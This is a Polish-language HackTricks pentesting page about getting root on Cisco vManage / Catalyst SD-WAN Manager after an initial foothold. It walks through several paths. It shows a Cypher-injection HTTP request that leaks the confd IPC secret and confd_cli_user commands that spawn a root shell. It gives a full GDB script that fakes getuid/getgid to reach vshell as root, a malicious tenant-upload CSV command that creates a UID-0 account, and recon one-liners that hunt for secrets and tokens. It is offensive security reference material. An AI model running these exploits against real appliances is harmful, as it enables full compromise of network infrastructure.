# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Po uzyskaniu code execution na Cisco vManage / *Catalyst SD-WAN Manager* jako `vmanage`, `netadmin` lub `vmanage-admin`, najciekawsze lokalne powierzchnie privesc zwykle obejmują stos CLI `confd`, helper `cmdptywrapper`, lokalne REST APIs oraz handlery importu/uploadu należące do roota.

Jeśli nadal potrzebujesz **initial foothold** na kontrolerze, najpierw sprawdź dedykowaną stronę control-plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Szybki lokalny triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Jeśli `/etc/confd/confd_ipc_secret` jest odczytywalny z Twojego footholda, Path 1 i Path 2 stają się od razu praktyczne. Jeśli uzyskałeś dostęp przez zdalny info leak lub webshell, sprawdź również, czy możesz już uzyskać dostęp do materiałów SSH `vmanage-admin` albo handlerów uploadu multitenancy: badania z 2026 roku wykazały, że oba były realistycznymi etapami pośrednimi.

## Path 1

(Przykład z [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Po krótkim przejrzeniu pewnej [dokumentacji](http://66.218.245.39/doc/html/rn03re18.html) dotyczącej `confd` i różnych binariów (dostępnej po zalogowaniu na stronie Cisco) odkryliśmy, że do uwierzytelnienia gniazda IPC używa sekretu znajdującego się w `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Pamiętasz naszą instancję Neo4j? Działa ona z uprawnieniami użytkownika `vmanage`, co pozwala nam pobrać plik za pomocą poprzedniej podatności:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Program `confd_cli` nie obsługuje argumentów wiersza poleceń, ale wywołuje `/usr/bin/confd_cli_user` z argumentami. Możemy więc bezpośrednio wywołać `/usr/bin/confd_cli_user`, przekazując własny zestaw argumentów. Nie możemy jednak odczytać tego programu przy naszych obecnych uprawnieniach, dlatego musimy pobrać go z rootfs i skopiować za pomocą scp, odczytać pomoc, a następnie użyć go do uzyskania shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Ścieżka 2

(Przykład z [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Blog¹ zespołu synacktiv opisywał elegancki sposób uzyskania powłoki root, jednak wymagał on zdobycia kopii pliku `/usr/bin/confd_cli_user`, który jest dostępny do odczytu wyłącznie dla użytkownika root. Znalazłem inny sposób na eskalację uprawnień do root bez takich problemów.

Podczas deasemblacji pliku binarnego `/usr/bin/confd_cli` zauważyłem następujące elementy:

<details>
<summary>Objdump pokazujący pobieranie UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Po uruchomieniu „ps aux” zaobserwowałem następujące (_uwaga -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Przypuszczałem, że program „confd_cli” przekazuje identyfikator użytkownika i identyfikator grupy zebrane od zalogowanego użytkownika do aplikacji „cmdptywrapper”.

Moja pierwsza próba polegała na bezpośrednim uruchomieniu „cmdptywrapper” i przekazaniu mu `-g 0 -u 0`, ale zakończyła się niepowodzeniem. Wygląda na to, że gdzieś po drodze został utworzony deskryptor pliku (-i 1015), którego nie mogę podrobić.

Jak wspomniano na blogu synacktiv (ostatni przykład), program `confd_cli` nie obsługuje argumentów wiersza poleceń, ale mogę na niego wpływać za pomocą debuggera, a na szczęście GDB jest dostępne w systemie.

Utworzyłem skrypt GDB, w którym wymusiłem, aby API `getuid` i `getgid` zwracały 0. Ponieważ mam już uprawnienia “vmanage” dzięki deserialization RCE, mam uprawnienia do bezpośredniego odczytu `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Dane wyjściowe konsoli:

<details>
<summary>Dane wyjściowe konsoli</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Ścieżka 3 (błąd walidacji danych wejściowych CLI z 2025 r. - CVE-2025-20122)

Cisco później opisało prostszą lokalną ścieżkę do root w swoim advisory dotyczącym [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): **uwierzytelniony attacker posiadający wyłącznie uprawnienia tylko do odczytu** mógł wysłać spreparowane żądanie do manager CLI i uzyskać root z powodu niewystarczającej walidacji danych wejściowych.

Z perspektywy offensive najważniejsze są następujące wnioski:

1. Gdy tylko uzyskasz *jakikolwiek foothold z niskimi uprawnieniami* na urządzeniu, przetestuj lokalny serwis CLI, zanim przejdziesz do bardziej złożonego workflow Path 1 / Path 2.
2. Wykorzystaj ponownie artefakty z Path 2, aby znaleźć granicę zaufania: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Traktuj każde pole przekazywane do backendu CLI jako podejrzane: UID/GID, username, metadane terminala, importowane pliki lub dowolną wartość później używaną przez helper uruchamiany jako root.
4. Jeśli użytkownik z niskimi uprawnieniami może uzyskać dostęp do lokalnego socketu CLI i wpływać na te pola, root może być oddalony tylko o jedno spreparowane żądanie.

Praktyczny workflow po uzyskaniu dostępu do appliance wygląda następująco:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
To zamienia błąd z 2025 roku w przydatny wzorzec do wyszukiwania podobnych wersji: szukaj **lokalnych nakładek CLI, które zbierają dane identyfikacyjne w userlandzie i przekazują je do bardziej uprzywilejowanego wrappera**.

Nie myl **CVE-2025-20122** z późniejszym **CVE-2026-20122**: problem z 2025 roku to *lokalny* błąd CLI-to-root, podczas gdy problem z 2026 roku to *zdalne* nadpisywanie dowolnych plików przez API, przydatne głównie do umieszczenia footholda, a następnie powrotu do Path 1 / Path 2 / Path 4.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

W poradniku bezpieczeństwa Cisco z lutego 2026 roku przedstawiono również inną przydatną klasę privesc: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) umożliwiał **uwierzytelnionemu lokalnemu attackerowi z niskimi uprawnieniami** uzyskanie uprawnień root z powodu niewystarczającego mechanizmu uwierzytelniania użytkownika w REST API.

Ma to znaczenie, ponieważ privesc w vManage nie ogranicza się już do nadużyć `confd`/TTY. Po uzyskaniu low-priv shella warto również szukać:

- endpointów API dostępnych wyłącznie lokalnie, które zbytnio ufają callerowi
- tokenów, cookies lub danych uwierzytelniających usług, które można odczytać z bieżącego konta
- działań dostępnych wyłącznie dla root, wystawionych przez handlery `dataservice`/REST, które nadal można lokalnie wywołać

W praktyce, po uzyskaniu shella jako `vmanage` lub inny service user, local API abuse jest często cichsze i łatwiejsze do automatyzacji niż interaktywne nadużywanie CLI:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Jeśli lokalny kontekst sesji wystarcza do uzyskania dostępu do uprzywilejowanych funkcji REST, preferuj ścieżkę API: łatwiej ją odtwarzać, skryptować i łączyć ze skradzionymi sesjami webowymi lub tokenami API.

## Path 5 (plik spreparowany w 2026 r. przetwarzany przez root - CVE-2026-20245)

Innym niedawnym wzorcem jest [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): lokalny attacker z uprawnieniami `netadmin` mógł przesłać **spreparowany plik**, który następnie był niebezpiecznie obsługiwany przez CLI, prowadząc do command injection jako `root`.

Z punktu widzenia HackTricks cenna technika jest szersza niż konkretna CVE:

1. Zidentyfikuj każdy workflow CLI lub webowy, który akceptuje plik: importy, paczki diagnostyczne, szablony, walidatory, backupy, dane tenantów itd.
2. Prześledź, gdzie trafia przesłany plik oraz który skrypt lub binarny plik należący do `root` go przetwarza.
3. Sprawdź, czy nazwa pliku, jego zawartość lub sparsowane metadane są kiedykolwiek przekazywane do poleceń powłoki, skryptów wrapperów lub helperów w stylu `system()`.
4. Jeśli masz już dostęp do `netadmin` (prawidłowe dane uwierzytelniające, skradziona sesja lub łańcuch auth-bypass), błędy w przetwarzaniu plików często stanowią najszybszą drogę do `root`.

Google Cloud / Mandiant pokazali później bardzo konkretny przypadek wykorzystania tej klasy błędu za pośrednictwem ścieżki importu multitenancy:
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
W zaobserwowanym ataku spreparowany plik CSV zmodyfikował `/etc/passwd` i `/etc/shadow`, aby utworzyć tymczasowe konto z UID 0 (`troot`). To sprawia, że importery w stylu `tenant-upload` / `tenant-list` są szczególnie interesujące: nie są tylko funkcjami ingestii danych, lecz potencjalnymi front-endami parserów uruchamianymi z uprawnieniami roota.

Szybki wzorzec wyszukiwania po stronie powłoki to:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Ta klasa błędów szczególnie dobrze łączy się ze zdalnymi footholdami, które zapewniają `netadmin`, ale nie `root`.

## Inne najnowsze luki vManage/Catalyst SD-WAN Manager do chainowania

- **Nieuwierzytelniony info leak (CVE-2026-20133)** – Szczególnie wartościowy, ponieważ publiczne badania wykazały, że może ujawnić `confd_ipc_secret` lub klucz prywatny `vmanage-admin`, zmieniając błąd odczytu w Path 1 albo pivot NETCONF.
- **Uwierzytelnione API umożliwiające dowolne nadpisywanie plików (CVE-2026-20122)** – Inna luka niż opisana wyżej luka CLI z 2025 roku; VulnCheck wykorzystał ją do przesłania webshella, co sprawia, że lokalne ścieżki privesc na tej stronie stają się natychmiast istotne.
- **Uwierzytelnione XSS w UI (CVE-2024-20475)** – Kradzież sesji administratora w web UI, a następnie pivot do działań API/CLI, które ostatecznie prowadzą do `vshell` lub jednej z opisanych wyżej lokalnych ścieżek privesc.
- **Zdalny auth bypass do `netadmin` (CVE-2026-20129)** – Bardzo silny prekursor dla Path 5, ponieważ `netadmin` to dokładnie poziom wymagany przez privesc z użyciem spreparowanego pliku z 2026 roku.
- **Uwierzytelniony dowolny zapis pliku (CVE-2026-20262)** – Podobna wartość ofensywna jak w przypadku CVE-2026-20122, ale za pośrednictwem późniejszej ścieżki uploadu w web UI: zapis do lokalizacji, która później zostanie sparsowana przez `root` lub web tier management plane.
- **Downgrade umożliwiający przywrócenie starego privesc CLI (CVE-2022-20775)** – Intruzje z 2026 roku wykazały, że atakujący mogą wycofać system do starszego podatnego buildu SD-WAN, wykorzystać stary błąd CLI prowadzący do `root`, a następnie przywrócić oryginalną wersję.
- **Pre-auth auth bypass control plane (CVE-2026-20182)** – Jest lepiej opisany na dedykowanej stronie control plane SD-WAN; może dodać klucz SSH dla `vmanage-admin`, zapewniając lokalny foothold potrzebny do ponownego wykorzystania informacji z tej strony.



## Referencje

- [Luki Cisco Catalyst SD-WAN (CVE-2026-20126, CVE-2026-20129 itd.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager i Catalyst SD-WAN Validator — uwierzytelniona luka umożliwiająca eskalację uprawnień (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats — najnowsze luki Cisco SD-WAN Manager](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: Eksploatacja zero-day luki (CVE-2026-20245) w Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
